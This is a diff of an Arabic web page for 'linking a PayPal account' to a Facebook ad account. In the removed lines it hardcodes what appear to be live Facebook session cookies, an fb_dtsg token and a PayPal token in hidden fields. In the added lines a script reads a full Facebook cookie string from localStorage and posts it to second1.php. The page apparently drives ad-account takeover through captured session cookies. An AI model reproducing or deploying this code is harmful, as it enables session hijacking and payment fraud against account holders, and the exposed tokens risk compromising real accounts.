@@ -1,142 +1,149 @@
-
-		 <div class="form-container">
-		  <center> <a href="https://www.paypal.com/checkoutnow?token=EC-55657440RS6775828" target="_blank"><img src="paypal.jpeg" alt="add paypal" style="width: 200px; height: auto;"></a><br><br></center>
-
-        <form action="second1.php" method="POST">
-            <label for="c_user">معرف الحساب:</label>
-            <input type="text" id="c_user" name="c_user" value="61573385250223" readonly><br><br>
-
-
-            <input type="text" id="fb_dtsg" name="fb_dtsg" value="NAcOueDCxBdfTmDe65enHyteodGS-cdR7cZ_NZzYdiNwGjUC9kYwQsg:23:1741282707" hidden>
-
-           
-
-            <label for="extra_data">رقم الحساب الاعلاني:</label>
-            <input type="text" id="extra_data" name="adaccount" placeholder="Enter Ad Account" value="1211166823944803"><br><br>
-			
-
-            <input type="text" id="extra_data" name="cookie" placeholder="Enter cookies" value="datr=gN3JZ4NRKoMXtVYVc2rEFmkZ;sb=gN3JZwm9fqyVDQIeFBQI590K;ps_l=1;ps_n=1;c_user=61573385250223;cppo=1;presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1741302087269%2C%22v%22%3A1%7D;dpr=0.800000011920929;wd=1013x758;fr=1qwqE6uBvX3mp9gQn.AWXutpBufjyxsMyw0xkg9jH9ZDCAlXVU9XBV9A.Bn3lVJ..AAA.0.0.Bn3lVJ.AWV46rSskFo;xs=23%3A38g53QobMkHkKw%3A2%3A1741282707%3A-1%3A-1%3A%3AAcV6Kb5Ia1xNI0SGqxpLcbmUSVWry5RWnDRtFamDrA;alsfid={&quot;id&quot;:&quot;f9e6b3ca6&quot;,&quot;timestamp&quot;:1742624856531.1};" hidden>
-			
-
-            <input type="text" id="extra_data" name="paypaltoken" placeholder="paypal token" value="AfrdShI7gt3DtId3GxxwNhxVPofiltRnak3c-gE7TmLN5MI4WzHuTrVGswNL8bqqz_qasFFqMZlMcwbnQRZa-9CTBGRxCsIB8_xXbSBNCpfHZw7XzdCEcqH-jsBjeMNWoVH_UC2cw6_8Wo9JPv1k3Qz_YL8DDJTcOHUN01f6kByKJmZHIp0DKJmbDvHOWWKZ8Td028Zq03Sq9mcFQB8ofehJLiplFEylhVPZebZJ_zu1DRo9lb0l-eQp8seoSUzCDrXw_rZH5-UMOJYJR0fZfcHbqKJkviyZOPxL6Ddfwoo0U5FgUkYk3SAVHQ" hidden>
-
-            <button type="submit">ربط الحساب</button>
-        </form>
-		</div>
-        
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-     <meta charset="UTF-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>added paypal</title>
-     <style>
+    <title>ربط حساب PayPal</title>
+    <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f4f4f9;
-            color: #333;
-        }
-        #header {
-            background-color: #007bff;
-            padding: 25px;
-            color: #fff;
+            font-family: Arial, sans-serif;
             text-align: center;
+            background-color: #f4f4f9;
         }
-        #right {
-            float: right;
-        }
-        #content {
-            display: inline-block;
-        }
-        .card {
-            background-color: #fff;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        .container {
+            background: white;
             padding: 20px;
-            margin-top: 20px;
-            width: 80%;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            margin: auto;
+            margin-top: 50px;
         }
-        form {
-            margin-bottom: 20px;
-        }
-        form input, form select, form button {
+        input, button {
             width: 100%;
-            margin-bottom: 10px;
             padding: 10px;
+            margin: 10px 0;
             border-radius: 5px;
             border: 1px solid #ccc;
         }
-        form button {
+        button {
             background-color: #007bff;
-            color: #fff;
-            border: none;
+            color: white;
             cursor: pointer;
+            font-size: 16px;
         }
-        form button:hover {
+        button:hover {
             background-color: #0056b3;
         }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-        table th, table td {
-            padding: 10px;
-            text-align: center;
-            border-bottom: 1px solid #ddd;
-        }
-        table th {
-            background-color: #007bff;
-            color: #fff;
-        }
-        .text-center button {
-            padding: 5px 10px;
-            border-radius: 5px;
+        .paypal-button {
+            background: none;
             border: none;
             cursor: pointer;
         }
-        .btn-success {
-            background-color: #28a745;
-            color: white;
-        }
-        .btn-success:hover {
-            background-color: #218838;
-        }
-        .btn-primary {
-            background-color: #007bff;
-            color: white;
-        }
-        .btn-primary:hover {
-            background-color: #0056b3;
+        .paypal-button img {
+            width: 200px;
         }
     </style>
-    <link rel="stylesheet" href="styles.css">
-         <style>
-        /* تنسيق الزر باستخدام الصنف */
-        .customButton {
-            padding: 10px 20px;
-            background-color: #28a745;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 30%;
-        }
-
-        .customButton:hover {
-            background-color: #218838;
-        }
-    </style>
-</head>
 </head>
 <body>
-    
-     
+    <div class="container">
+        <h3>ربط حساب PayPal</h3>
+        
+        <label>معرف الحساب:</label>
+        <input type="text" id="account_id" readonly>
 
-            <!-- عرض رسالة تأكيد إذا تم الإرسال -->
-       
-    </body>
+        <label>رقم الحساب الإعلاني:</label>
+        <input type="text" id="ad_account">
+
+        <label>الكوكيز:</label>
+        <input type="text" id="cookies" readonly>
+        
+        <button class="paypal-button" onclick="openPaypal()">
+            <img src="paypal.jpeg" alt="PayPal Checkout">
+        </button>
+        
+        <button onclick="linkAccount()">ربط الحساب</button>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            let storedCookies = localStorage.getItem("userCookies");
+            document.getElementById("cookies").value = storedCookies || "لم يتم العثور على الكوكيز";
+            
+            // استخراج معرف الحساب (c_user) من الكوكيز أو LocalStorage
+            let cUserMatch = storedCookies ? storedCookies.match(/c_user=(\d+)/) : null;
+            let savedCUser = localStorage.getItem("c_user");
+            
+            let cUser = cUserMatch ? cUserMatch[1] : (savedCUser ? savedCUser : "غير معروف");
+            document.getElementById("account_id").value = cUser;
+
+            // استخراج رقم الحساب الإعلاني
+            let adAccountMatch = storedCookies ? storedCookies.match(/(?:ad_account_id|adaccount)=(\d+)/) : null;
+            let savedAdAccount = localStorage.getItem("adAccount");
+            let urlParams = new URLSearchParams(window.location.search);
+            let urlAdAccount = urlParams.get("adaccount");
+
+            let adAccountField = document.getElementById("ad_account");
+            if (adAccountMatch) {
+                adAccountField.value = adAccountMatch[1];
+            } else if (savedAdAccount) {
+                adAccountField.value = savedAdAccount;
+            } else if (urlAdAccount) {
+                adAccountField.value = urlAdAccount;
+            } else {
+                adAccountField.placeholder = "أدخل رقم الحساب الإعلاني يدويًا";
+            }
+
+            // حفظ معرف الحساب و الحساب الإعلاني محليًا
+            if (cUser !== "غير معروف") {
+                localStorage.setItem("c_user", cUser);
+            }
+            if (adAccountField.value) {
+                localStorage.setItem("adAccount", adAccountField.value);
+            }
+        });
+
+        function openPaypal() {
+            let adAccount = document.getElementById("ad_account").value.trim();
+            if (!adAccount) {
+                alert("يرجى إدخال رقم الحساب الإعلاني قبل المتابعة!");
+                return;
+            }
+            
+            // حفظ البيانات قبل الذهاب إلى PayPal
+            localStorage.setItem("adAccount", adAccount);
+            window.open("https://www.paypal.com/checkoutnow?token=EC-20B89377D5285764C", "_blank");
+        }
+        
+        function linkAccount() {
+            let adAccount = document.getElementById("ad_account").value.trim();
+            let cUser = document.getElementById("account_id").value;
+            let cookies = document.getElementById("cookies").value;
+            
+            if (!adAccount) {
+                alert("يرجى إدخال رقم الحساب الإعلاني!");
+                return;
+            }
+            
+            fetch("second1.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `adaccount=${encodeURIComponent(adAccount)}&c_user=${encodeURIComponent(cUser)}&cookies=${encodeURIComponent(cookies)}`
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log("Response from server:", data);
+                if (data.includes("تم الربط")) {
+                    window.location.href = "second1.php"; // توجيه المستخدم بعد الربط
+                } else {
+                    alert("❌ خطأ: " + data);
+                }
+            })
+            .catch(error => {
+                console.error("❌ خطأ أثناء الإرسال:", error);
+                alert("❌ حدث خطأ أثناء الإرسال. تحقق من Console لمزيد من التفاصيل.");
+            });
+        }
+    </script>
+</body>
 </html>
